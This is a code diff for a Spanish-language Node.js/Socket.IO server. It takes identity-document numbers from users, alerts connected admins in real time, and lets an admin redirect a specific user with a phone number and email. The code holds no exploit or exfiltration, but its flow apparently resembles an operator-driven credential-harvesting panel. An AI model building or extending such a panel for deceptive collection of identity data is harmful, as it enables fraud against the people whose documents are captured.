@@ -18,39 +18,37 @@ const io = socketIo(server, {
 app.use(cors());
 app.use(express.json());
 
-// Almacenamiento en memoria VOLÁTIL - sesiones activas solamente
+// Almacenamiento en memoria - SOLO sesiones activas
 const activeSessions = new Map();
 const adminSockets = new Set();
 
-// Limpiar sesiones antiguas cada 30 segundos
-setInterval(() => {
-  const now = Date.now();
-  let cleaned = 0;
-  
-  activeSessions.forEach((session, sessionId) => {
-    // Eliminar sesiones completadas con más de 10 segundos
-    if (session.status === 'completed' && session.completedAt && (now - session.completedAt) > 10000) {
-      activeSessions.delete(sessionId);
-      cleaned++;
-    }
-    // Eliminar sesiones waiting con más de 30 minutos (por si acaso)
-    else if (session.status === 'waiting' && (now - session.timestamp) > 1800000) {
-      activeSessions.delete(sessionId);
-      cleaned++;
+// Función para notificar a TODOS los admins
+const notifyAllAdmins = (event, data) => {
+  console.log(`📢 Notificando a ${adminSockets.size} admins: ${event}`);
+  adminSockets.forEach(adminSocket => {
+    if (adminSocket.connected) {
+      try {
+        adminSocket.emit(event, data);
+      } catch (error) {
+        console.log('❌ Error notificando admin:', error);
+      }
     }
   });
-  
-  if (cleaned > 0) {
-    console.log(`🧹 Limpiadas ${cleaned} sesiones antiguas`);
-  }
-}, 30000);
+};
+
+// Función para obtener sesiones en espera
+const getWaitingSessions = () => {
+  return Array.from(activeSessions.values())
+    .filter(s => s.status === 'waiting')
+    .sort((a, b) => a.timestamp - b.timestamp);
+};
 
 app.post('/api/session', (req, res) => {
   const { documentType, documentNumber, sessionId } = req.body;
   
-  console.log(`🎯 NUEVA SESIÓN INMEDIATA: ${sessionId} - ${documentNumber}`);
+  console.log(`🎯 NUEVA SESIÓN RECIBIDA: ${sessionId} - ${documentNumber}`);
   
-  // Crear sesión NUEVA siempre - sin verificar duplicados
+  // CREAR SESIÓN NUEVA SIEMPRE
   const sessionData = {
     sessionId,
     documentType,
@@ -64,31 +62,22 @@ app.post('/api/session', (req, res) => {
     completedAt: null
   };
   
-  // GUARDAR SESIÓN INMEDIATAMENTE
+  // GUARDAR INMEDIATAMENTE
   activeSessions.set(sessionId, sessionData);
   
-  // Obtener SOLO sesiones en espera para enviar
-  const waitingSessions = Array.from(activeSessions.values())
-    .filter(s => s.status === 'waiting')
-    .sort((a, b) => a.timestamp - b.timestamp); // Ordenar por timestamp
+  // Obtener sesiones actualizadas
+  const waitingSessions = getWaitingSessions();
   
-  console.log(`📊 Total sesiones waiting: ${waitingSessions.length}`);
+  console.log(`📊 Sesiones en espera: ${waitingSessions.length}`);
   
-  // EMITIR A TODOS LOS ADMINS CONECTADOS - INMEDIATAMENTE
-  if (adminSockets.size > 0) {
-    adminSockets.forEach(adminSocket => {
-      if (adminSocket.connected) {
-        adminSocket.emit('sessions_list', waitingSessions);
-        adminSocket.emit('new_session', sessionData);
-        console.log(`📤 Enviado a admin: ${adminSocket.id}`);
-      }
-    });
-  }
+  // NOTIFICAR A TODOS LOS ADMINS INMEDIATAMENTE
+  notifyAllAdmins('new_session', sessionData);
+  notifyAllAdmins('sessions_list', waitingSessions);
   
   res.json({ 
     success: true, 
     sessionId,
-    message: `Sesión registrada - Notificando a ${adminSockets.size} admins`
+    message: `Sesión registrada y notificada a ${adminSockets.size} admins`
   });
 });
 
@@ -114,18 +103,12 @@ app.post('/api/session/:sessionId/redirect', (req, res) => {
     session.emailAddress = emailAddress;
     session.completedAt = Date.now();
     
-    // Notificar a todos los admins INMEDIATAMENTE
-    const waitingSessions = Array.from(activeSessions.values())
-      .filter(s => s.status === 'waiting');
+    // Notificar a todos los admins
+    const waitingSessions = getWaitingSessions();
+    notifyAllAdmins('session_updated', session);
+    notifyAllAdmins('sessions_list', waitingSessions);
     
-    adminSockets.forEach(adminSocket => {
-      if (adminSocket.connected) {
-        adminSocket.emit('session_updated', session);
-        adminSocket.emit('sessions_list', waitingSessions);
-      }
-    });
-    
-    // Redirigir al usuario específico
+    // Redirigir al usuario
     io.to(sessionId).emit('redirect', { redirectTo, phoneNumber, emailAddress });
     
     console.log(`🔄 Sesión ${sessionId} COMPLETADA → ${redirectTo}`);
@@ -137,8 +120,7 @@ app.post('/api/session/:sessionId/redirect', (req, res) => {
 
 // Endpoint para obtener estado actual
 app.get('/api/status', (req, res) => {
-  const waitingSessions = Array.from(activeSessions.values())
-    .filter(s => s.status === 'waiting');
+  const waitingSessions = getWaitingSessions();
   
   res.json({
     success: true,
@@ -149,19 +131,17 @@ app.get('/api/status', (req, res) => {
   });
 });
 
-// SOCKET.IO CONNECTION HANDLING
+// SOCKET.IO - Conexiones en tiempo real
 io.on('connection', (socket) => {
   console.log('🔌 NUEVA CONEXIÓN:', socket.id);
   
-  // Detectar admins
+  // ADMIN se conecta
   socket.on('admin_connect', () => {
     console.log('👨‍💼 ADMIN CONECTADO:', socket.id);
     adminSockets.add(socket);
     
-    // Enviar estado actual inmediatamente
-    const waitingSessions = Array.from(activeSessions.values())
-      .filter(s => s.status === 'waiting');
-    
+    // Enviar estado actual INMEDIATAMENTE
+    const waitingSessions = getWaitingSessions();
     socket.emit('sessions_list', waitingSessions);
     socket.emit('connection_established', { 
       message: 'Admin conectado',
@@ -171,7 +151,7 @@ io.on('connection', (socket) => {
     console.log(`📨 Estado enviado a admin ${socket.id}: ${waitingSessions.length} sesiones`);
   });
   
-  // Detectar usuarios
+  // USUARIO se conecta
   socket.on('user_connect', (sessionId) => {
     socket.join(sessionId);
     console.log('👤 Usuario conectado para sesión:', sessionId);
@@ -186,10 +166,6 @@ io.on('connection', (socket) => {
       console.log('👨‍💼 Admin removido:', socket.id);
     }
   });
-  
-  socket.on('error', (error) => {
-    console.log('❌ Error en socket:', socket.id, error);
-  });
 });
 
 function getDocumentTypeText(type) {
@@ -201,24 +177,21 @@ function getDocumentTypeText(type) {
   return types[type] || 'Documento';
 }
 
-// Health check endpoint
+// Health check
 app.get('/health', (req, res) => {
-  const waitingSessions = Array.from(activeSessions.values())
-    .filter(s => s.status === 'waiting');
+  const waitingSessions = getWaitingSessions();
     
   res.json({
     status: 'OK',
     timestamp: new Date().toISOString(),
     activeSessions: activeSessions.size,
     waitingSessions: waitingSessions.length,
-    connectedAdmins: adminSockets.size,
-    memoryUsage: process.memoryUsage()
+    connectedAdmins: adminSockets.size
   });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`🚀 Servidor backend ejecutándose en puerto ${PORT}`);
-  console.log(`📡 WebSockets ULTRA RÁPIDOS activos`);
-  console.log(`⏰ Listo para recibir conexiones en tiempo real`);
+  console.log(`⚡ LISTO para comunicación en tiempo real ULTRA RÁPIDA`);
 });
